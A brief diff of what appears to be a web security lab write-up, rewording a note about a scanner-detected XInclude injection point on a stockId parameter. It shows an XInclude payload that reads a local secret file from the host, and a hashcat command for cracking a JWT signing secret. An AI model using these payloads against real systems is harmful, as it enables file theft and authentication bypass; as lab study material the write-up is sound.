@@ -835,7 +835,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ![scan-defined-insertion-points](scan-defined-insertion-points.png)  
 
->Scanner detected xmlns on stockId parameter and can lead to reading file on host.  
+>Scanner detected xmlns on stockId parameter and can lead to reading file on host parse text.  
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
